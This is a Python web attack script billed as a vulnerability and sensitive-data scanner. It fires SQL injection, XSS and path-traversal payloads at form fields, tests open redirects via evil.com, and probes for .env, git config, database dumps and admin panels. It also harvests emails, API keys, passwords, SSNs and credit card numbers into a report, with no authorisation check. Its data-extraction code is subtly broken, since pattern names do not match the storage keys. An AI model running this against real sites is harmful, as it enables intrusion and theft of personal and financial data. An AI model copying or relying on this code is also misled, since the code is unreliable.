# ==============================================================
#  FULL-FEATURED WEB VULNERABILITY & SENSITIVE DATA SCANNER
#  Compact code, complete functionality:
#  - SQL Injection, XSS, LFI, Open Redirect detection
#  - Sensitive file exposure & admin panel enumeration
#  - Extraction of emails, API keys, passwords, hidden inputs, SSN, credit cards
#  - Multi-threaded with configurable thread count
#  Usage: python scanner.py <target> [--threads N]
#  target can be URL (http(s)://...) or IP[:port]
# ==============================================================

import sys
import re
import urllib.parse
import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random

# ---------- CONFIGURATION ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Safari/537.36",
]
TIMEOUT = 8
THREADS = 10  # default, overridden by --threads
OUTPUT_FILE = "scan_results.txt"
SENSITIVE_FILES = [
    ".env", ".git/config", "wp-config.php", "config.php", "database.yml",
    "admin.php", "phpinfo.php", "backup.sql", "dump.sql", "credentials.txt"
]
COMMON_ADMIN_PATHS = [
    "admin", "administrator", "wp-admin", "login", "cpanel", "phpmyadmin",
    "manager", "controlpanel", "admin.php", "user/login", "auth/login"
]
SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' --", "\" --", "';--", "\";--"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>", "javascript:alert(1)"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd"]
SENSITIVE_PATTERNS = {
    "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    "phone": r"(\+?\d{1,3}[-.\s]?)?\(?\d{2,4}\)?[-.\s]?\d{2,4}[-.\s]?\d{2,4}",
    "api_key": r"(?i)(api[_-]?key|apikey|secret|token)['\":\s]*[=:]\s*['\"]?([A-Za-z0-9+/=_-]{20,})['\"]?",
    "password_in_html": r"(?i)(password|passwd|pwd)[\s=:]+['\"]?([^'\"\s<>]+)",
    "hidden_input": r"<input[^>]*type=[\"']hidden[\"'][^>]*name=[\"']([^\"']+)[\"'][^>]*value=[\"']([^\"']*)[\"']",
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "credit_card": r"\b(?:\d{4}[ -]?){3}\d{4}\b"
}

# ---------- GLOBAL STATE ----------
url_queue = queue.Queue()
visited_urls = set()
vulnerabilities = []
extracted_data = {"emails": set(), "phones": set(), "api_keys": set(), "passwords": set(), "hidden_inputs": {}, "ssn": set(), "credit_cards": set()}
lock = threading.Lock()
TARGET_BASE = ""   # scheme://netloc with optional port
TARGET_HOST = ""   # netloc only

def random_agent():
    return random.choice(USER_AGENTS)

def make_request(url, params=None, cookies=None, method="GET", data=None, allow_redirects=True):
    headers = {"User-Agent": random_agent()}
    try:
        if method == "GET":
            resp = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=allow_redirects)
        else:
            resp = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=allow_redirects)
        return resp
    except requests.RequestException:
        return None

# ---------- CORE SCANNING ----------
def scan_sql_injection(url, param):
    sqli_errors = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "Unclosed quotation mark",
        "you have an error in your SQL syntax", "Warning: mysql"
    ]
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
        resp = make_request(test_url)
        if resp:
            content = resp.text.lower()
            for err in sqli_errors:
                if err.lower() in content:
                    with lock:
                        vulnerabilities.append(f"[SQL Injection] Parameter '{param}' with payload '{payload}' on {test_url} => Possible SQLi (error '{err}')")
                    vulnerable = True
                    break
            if vulnerable:
                break
    return vulnerable

def scan_xss(url, param):
    test_payload = "<scrIpt>alert(1)</scrIpt>"
    test_url = url + "?" + param + "=" + urllib.parse.quote(test_payload)
    resp = make_request(test_url)
    if resp and test_payload in resp.text:
        with lock:
            vulnerabilities.append(f"[XSS] Reflected XSS found in parameter '{param}' on {url}")
        return True
    return False

def scan_lfi(url, param):
    for payload in LFI_PAYLOADS:
        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
        resp = make_request(test_url)
        if resp:
            if "root:x:" in resp.text or "[boot loader]" in resp.text or "Windows" in resp.text:
                with lock:
                    vulnerabilities.append(f"[LFI] Possible LFI in parameter '{param}' with payload '{payload}' on {url}")
                return True
    return False

def scan_open_redirect(url, param):
    redirect_test = "https://evil.com"
    test_url = url + "?" + param + "=" + urllib.parse.quote(redirect_test)
    resp = make_request(test_url, allow_redirects=False)
    if resp and resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get("Location", "")
        if redirect_test in location:
            with lock:
                vulnerabilities.append(f"[Open Redirect] Parameter '{param}' redirects to external site on {url}")
            return True
    return False

def check_sensitive_file(base_url, path):
    full_url = urllib.parse.urljoin(base_url, path)
    resp = make_request(full_url)
    if resp and resp.status_code == 200:
        content_size = len(resp.content)
        if content_size > 10:
            with lock:
                vulnerabilities.append(f"[Sensitive File Exposure] Found {full_url} (size {content_size} bytes)")
            extract_sensitive_data(resp.text, full_url)
            return True
    return False

def enumerate_admin_panels(base_url):
    for path in COMMON_ADMIN_PATHS:
        full_url = urllib.parse.urljoin(base_url, path)
        resp = make_request(full_url)
        if resp and resp.status_code == 200:
            if any(kw in resp.text.lower() for kw in ["password", "username", "admin", "dashboard", "login"]):
                with lock:
                    vulnerabilities.append(f"[Admin Panel Found] {full_url} (status 200, contains auth keywords)")
                extract_sensitive_data(resp.text, full_url)

def extract_sensitive_data(html, source_url):
    for category, pattern in SENSITIVE_PATTERNS.items():
        matches = re.findall(pattern, html, re.IGNORECASE)
        if category == "hidden_input":
            for name, value in matches:
                with lock:
                    extracted_data["hidden_inputs"][source_url] = extracted_data["hidden_inputs"].get(source_url, [])
                    extracted_data["hidden_inputs"][source_url].append(f"{name}={value}")
        else:
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0] if match[0] else match[1]
                with lock:
                    getattr(extracted_data[category], 'add')(match)

def crawl_page(url, depth):
    # Single-page scan: no recursion, depth ignored
    if url in visited_urls:
        return
    with lock:
        visited_urls.add(url)
    resp = make_request(url)
    if not resp or resp.status_code != 200:
        return
    html = resp.text
    soup = BeautifulSoup(html, "lxml")
    # Extract forms and parameters
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        params = {}
        for inp in inputs:
            name = inp.get("name")
            if name:
                params[name] = inp.get("value", "")
        action_url = urllib.parse.urljoin(url, action)
        for param in params:
            scan_sql_injection(action_url, param)
            scan_xss(action_url, param)
            scan_lfi(action_url, param)
            scan_open_redirect(action_url, param)
    # Extract sensitive data from this page
    extract_sensitive_data(html, url)
    # Check sensitive files / admin panels only for the root request
    if depth == 0:
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for sfile in SENSITIVE_FILES:
            check_sensitive_file(base, sfile)
        enumerate_admin_panels(base)

def worker():
    while True:
        try:
            url, depth = url_queue.get(timeout=3)
        except queue.Empty:
            break
        crawl_page(url, depth)
        url_queue.task_done()

# ---------- MAIN ----------
def main():
    global THREADS, TARGET_BASE, TARGET_HOST
    if len(sys.argv) < 2:
        print("Usage: python scanner.py <target> [--threads N]")
        print("  target: URL (http(s)://...) or IP[:port]")
        sys.exit(1)

    target_input = sys.argv[1]
    # Parse optional --threads
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--threads" and i+1 < len(sys.argv):
            THREADS = int(sys.argv[i+1])
            i += 2
        else:
            i += 1

    # Normalize target: if no scheme, prepend http://
    if not target_input.startswith(('http://', 'https://')):
        target_input = 'http://' + target_input
    parsed = urllib.parse.urlparse(target_input)
    if not parsed.netloc:
        print("[-] Invalid target: no host")
        sys.exit(1)
    TARGET_BASE = f"{parsed.scheme}://{parsed.netloc}"
    TARGET_HOST = parsed.netloc
    target_url = target_input.rstrip('/')

    print(f"[*] Target: {target_url}")
    print(f"[*] Threads: {THREADS}")

    # Start scanning
    start_time = time.time()
    url_queue.put((target_url, 0))
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    url_queue.join()
    for t in threads:
        t.join(timeout=1)

    # Output results
    print("\n[+] Vulnerabilities found:")
    for vuln in vulnerabilities:
        print(f"  - {vuln}")
    print("\n[+] Extracted Sensitive Data (truncated):")
    for cat, data in extracted_data.items():
        if cat == "hidden_inputs":
            for page, inputs in data.items():
                print(f"  Hidden inputs on {page}: {', '.join(inputs)}")
        else:
            if data:
                print(f"  {cat}: {', '.join(list(data)[:20])}")

    # Save full report
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', target_url)
    out_file = f"scan_{safe_name}.txt"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(f"===== SCAN REPORT FOR {target_url} =====\n\n")
        f.write("===== VULNERABILITIES =====\n")
        f.write("\n".join(vulnerabilities) + "\n\n")
        f.write("===== SENSITIVE DATA =====\n")
        for cat, items in extracted_data.items():
            f.write(f"\n--- {cat} ---\n")
            if cat == "hidden_inputs":
                for page, inputs in items.items():
                    f.write(f"  {page}: {inputs}\n")
            else:
                for item in items:
                    f.write(f"  {item}\n")
    elapsed = time.time() - start_time
    print(f"\n[*] Scan finished in {elapsed:.2f} sec. Full results saved to {out_file}")

if __name__ == "__main__":
    main()
